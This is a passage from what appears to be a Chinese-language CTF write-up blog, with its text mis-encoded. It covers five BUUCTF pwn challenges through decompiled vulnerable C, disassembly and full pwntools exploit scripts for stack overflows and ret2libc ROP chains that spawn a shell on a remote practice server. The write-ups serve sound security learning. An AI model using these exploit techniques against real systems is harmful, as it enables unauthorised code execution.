æ­¤åªè¦å¾—åˆ°putså‡½æ•°çš„åœ°å€ï¼Œå°±å¯ä»¥å¾—åˆ°libcçš„ç‰ˆæœ¬</li><li>ç”±äºlibcå†…çš„å‡½æ•°çš„ç›¸å¯¹åç§»ä¸éšç€libcåº“ç‰ˆæœ¬çš„æ”¹å˜è€Œæ”¹å˜ï¼Œå› æ­¤åªè¦å¾—åˆ°putså‡½æ•°çš„åœ°å€ï¼Œå°±å¯ä»¥å¾—åˆ°å…¶ä½™å‡½æ•°çš„åœ°å€ï¼ˆæ¯”å¦‚systemå‡½æ•°ã€shå­—ç¬¦ä¸²ï¼‰</li></ul><p>æœ‰å‡ ä¸ªæ˜“é”™çš„ç‚¹ï¼š</p><ul><li>64ä½ä½¿ç”¨å¯„å­˜å™¨ä¼ å‚ï¼Œè€Œä¸æ˜¯æ ˆï¼Œå› æ­¤æ„é€ ropé“¾çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨pop_rdi_retå°†å‚æ•°æ”¾åœ¨å¯„å­˜å™¨ä¹‹åè°ƒç”¨å‡½æ•°ã€‚<code>payload = b&#39;a&#39; * (88)  + p64(ret) +  p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</code></li><li>ä½¿ç”¨recvæ—å‡½æ•°åæ‰å¤šä½™çš„è¾“å‡ºï¼Œå¹¶è·å–åœ°å€<code>puts_addr = u64(sh.recvline()[:-1].ljust(8,b&#39;\x00&#39;)) # puts puts_got.get puts addr</code></li><li>ç”±äºUbuntu18çš„è¿è¡Œæœºåˆ¶ï¼Œæ­¤é¢˜ä¸åŠ retåˆ™æ ˆæ— æ³•å¯¹é½ï¼ˆè²Œä¼¼systemå‡½æ•°å¿…é¡»åœ¨åœ°å€ä»¥0ç»“æŸçš„ä½ç½®ï¼Œè€Œæœ¬é¢˜æ˜¯8ï¼‰</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-comment">#sh = process(&#x27;./ciscn_2019_c_1&#x27;)</span><br>sh=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27910</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-comment"># 0x0000000000400c83 : pop rdi ; ret</span><br><br>pop_rdi_ret=<span class="hljs-number">0x0000000000400c83</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">88</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)+p64(main)<br><br><span class="hljs-comment"># gdb.attach(sh) </span><br><br>sh.recv()<br>sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)<br><br>sh.sendline(payload)<br><br>sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#puts(&quot;Ciphertext&quot;);</span><br>sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#puts(&quot;payload&quot;);</span><br>puts_addr = u64(sh.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment"># puts puts_got.get puts addr</span><br><br><span class="hljs-comment">#print(hex(puts_addr))</span><br><span class="hljs-comment">#pause()</span><br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr) <span class="hljs-comment"># Â search libc</span><br><br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>) <span class="hljs-comment"># Â get libc base</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-comment"># Â get system addr</span><br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>) <span class="hljs-comment"># Â get /bin/sh addr</span><br><br><br>sh.recv()<br>sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)<br><span class="hljs-comment">#gdb.attach(sh)</span><br>ret = <span class="hljs-number">0x00000000004006b9</span><br><span class="hljs-comment">#é”™è¯¯çš„ï¼špayload = b&#x27;a&#x27; * (88)  + p64(system_addr) + p64(0xaaaa) + p64(binsh_addr)</span><br><span class="hljs-comment"># Ubuntu18è¿è¡Œæœºåˆ¶  ä¸åŠ ret åˆ™æ ˆæ— æ³•å¯¹é½ï¼Œå³systemçš„å°¾éƒ¨æ˜¯8è€Œä¸æ˜¯0ï¼špayload = b&#x27;a&#x27; * (88)  + p64(ret)+p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">88</span>)  + p64(ret) +  p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br>sh.sendline(payload)<br><br>sh.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-n-8-1"><a href="#ciscn-2019-n-8-1" class="headerlink" title="ciscn_2019_n_8-1"></a>ciscn_2019_n_8-1</h1><p>ä¿æŠ¤å…¨å¼€ï¼Œçœ‹ä¸‹æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp-14h] [ebp-20h]</span><br>  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp-10h] [ebp-1Ch]</span><br><br>  var[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>  var[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br>  init();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, var, v4, v5);<br>  <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] == <span class="hljs-number">17LL</span> )<br>      system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<br>        <span class="hljs-string">&quot;something wrong! val is %d&quot;</span>,<br>        var[<span class="hljs-number">0</span>],<br>        var[<span class="hljs-number">1</span>],<br>        var[<span class="hljs-number">2</span>],<br>        var[<span class="hljs-number">3</span>],<br>        var[<span class="hljs-number">4</span>],<br>        var[<span class="hljs-number">5</span>],<br>        var[<span class="hljs-number">6</span>],<br>        var[<span class="hljs-number">7</span>],<br>        var[<span class="hljs-number">8</span>],<br>        var[<span class="hljs-number">9</span>],<br>        var[<span class="hljs-number">10</span>],<br>        var[<span class="hljs-number">11</span>],<br>        var[<span class="hljs-number">12</span>],<br>        var[<span class="hljs-number">13</span>],<br>        var[<span class="hljs-number">14</span>]);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s, Welcome!\n&quot;</span>, var);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Try do something~&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åªéœ€å°†æ•°ç»„varçš„ç¬¬14ä¸ªå…ƒç´ æ”¹æˆ17å³å¯ã€‚æ¯ä¸ªæ•°ç»„å€¼ä¸º4ä¸ªå­—èŠ‚ï¼Œå› æ­¤<code>payload=b&#39;\x11\x00\x00\x00&#39;*14</code>ï¼Œæ³¨æ„å¦‚æœä¿®æ”¹äº†ç¬¬15ä¸ªå…ƒç´ ï¼Œä¹Ÿå³æ˜¯var[14]ä¼šæŠ¥é”™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>sh = process(<span class="hljs-string">&#x27;./ciscn_2019_n_8&#x27;</span>)<br><span class="hljs-comment">#sh=remote(&#x27;node4.buuoj.cn&#x27;, 27910)</span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_n_8&#x27;</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x11\x00\x00\x00&#x27;</span>*<span class="hljs-number">14</span><br><span class="hljs-comment">#b&#x27;\x11\x00\x00\x00&#x27;*30</span><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">~&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./level2</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/level2&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>readè¯»å…¥256å­—èŠ‚ï¼Œå­˜åœ¨æº¢å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">vulnerable_function</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">136</span>]; <span class="hljs-comment">// [esp+0h] [ebp-88h] BYREF</span><br><br>  system(<span class="hljs-string">&quot;echo Input:&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>u);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  vulnerable_function();<br>  system(<span class="hljs-string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>shift+f12æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå‘ç°äº†sh</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">.data:<span class="hljs-number">0804</span>A024 <span class="hljs-keyword">hint</span>            db <span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>æ°´é¢˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-comment">#sh = process(&#x27;./ciscn_2019_n_8&#x27;)</span><br>sh=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27901</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./level2&#x27;</span>)<br><br>sys_addr=<span class="hljs-number">0x08048320</span><br>binsh_addr=<span class="hljs-number">0x0804A024</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(sys_addr)+p32(<span class="hljs-number">0xdeadbeef</span>)+p32(binsh_addr)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br><br><br></code></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-keyword">size_t</span> nbytes; <span class="hljs-comment">// [rsp+Ch] [rbp-4h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0LL</span>);<br> <br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Please input the length of your name:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nbytes);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]What&#x27;s u name?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)nbytes);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>å…ˆè¾“å…¥100ï¼Œä½¿å¾—è¯»å…¥100ä¸ªå­—èŠ‚ï¼Œå¯¼è‡´æº¢å‡º</li><li>åœ¨ä»£ç æ®µæ‰¾åˆ°system_shï¼Œåœ°å€ä¸º00000000004006E6</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006E6</span> <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006E6</span>                 <span class="hljs-keyword">push</span>    rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006E7</span>                 <span class="hljs-keyword">mov</span>     rbp, rsp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>EA                 <span class="hljs-keyword">mov</span>     edi, offset command <span class="hljs-comment">; &quot;/bin/sh&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>EF                 <span class="hljs-keyword">call</span>    _system<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>F4                 <span class="hljs-keyword">mov</span>     eax, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>F9                 <span class="hljs-keyword">pop</span>     rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>FA                 retn<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>FA <span class="hljs-comment">; &#125; // starts at 4006E6</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>FA backdoor        endp<br></code></pre></td></tr></table></figure><p>æ°µ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>sh=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27644</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./level2&#x27;</span>)<br><br>sys_sh_addr= <span class="hljs-number">0x00000000004006EA</span><br><br>sh.recvuntil(<span class="hljs-string">&#x27;of your name:\n&#x27;</span>)<br>sh.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">100</span>))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>)+p64(sys_sh_addr)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"> <span class="hljs-string">~&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./get_started_3dsctf_2016</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/get_started_3dsctf_2016&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>getså¯¼è‡´æº¢å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">56</span>]; <span class="hljs-comment">// [esp+4h] [ebp-38h] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="hljs-number">0</span>]);<br>  gets(v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªé¢˜æœ‰ä¸ªå¤§å‘ï¼Œå°±æ˜¯mainå‡½æ•°ä¸æ˜¯é€šè¿‡push ebpï¼›mov ebp ,  esp å‹æ ˆçš„</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>08048A20 main            proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: _start+17â†‘o</span><br><span class="hljs-symbol">.text:</span>08048A20<br><span class="hljs-symbol">.text:</span>08048A20 var_3C          = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">3Ch</span><br><span class="hljs-symbol">.text:</span>08048A20 var_38          = <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">38h</span><br><span class="hljs-symbol">.text:</span>08048A20 argc            = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span>  <span class="hljs-number">4</span><br><span class="hljs-symbol">.text:</span>08048A20 argv            = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span>  <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>08048A20 envp            = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span>  <span class="hljs-number">0Ch</span><br><span class="hljs-symbol">.text:</span>08048A20<br><span class="hljs-symbol">.text:</span>08048A20                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">3Ch</span><br><span class="hljs-symbol">.text:</span>08048A23                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">3Ch</span>+var_3C], offset aQualAPalavrinh <span class="hljs-comment">; &quot;Qual a palavrinha magica? &quot;</span><br><span class="hljs-symbol">.text:</span>08048A2A                 <span class="hljs-keyword">call</span>    printf<br><span class="hljs-symbol">.text:</span>08048A2F                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">esp</span>+<span class="hljs-number">3Ch</span>+var_38]<br><span class="hljs-symbol">.text:</span>08048A33                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">esp</span>+<span class="hljs-number">3Ch</span>+var_3C], <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>08048A36                 <span class="hljs-keyword">call</span>    gets<br><span class="hljs-symbol">.text:</span>08048A3B                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>08048A3D                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">3Ch</span><br><span class="hljs-symbol">.text:</span>08048A40                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>08048A40 main            endp<br></code></pre></td></tr></table></figure><p>çœ‹æœ€åä¸¤è¡Œå°±å¯ä»¥çœ‹å‡ºæ¥ï¼ŒæŠ¬æ ˆä¹‹åç›´æ¥ret</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>08048A3D                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">esp</span>, <span class="hljs-number">3Ch</span><br><span class="hljs-symbol">.text:</span>08048A40                 <span class="hljs-keyword">retn</span><br></code></pre></td></tr></table></figure><p>shift+f12æŸ¥å­—ç¬¦ä¸²ï¼Œè·Ÿè¿›flag.txtçš„å¼•ç”¨ï¼Œå‘ç°ç›´æ¥open 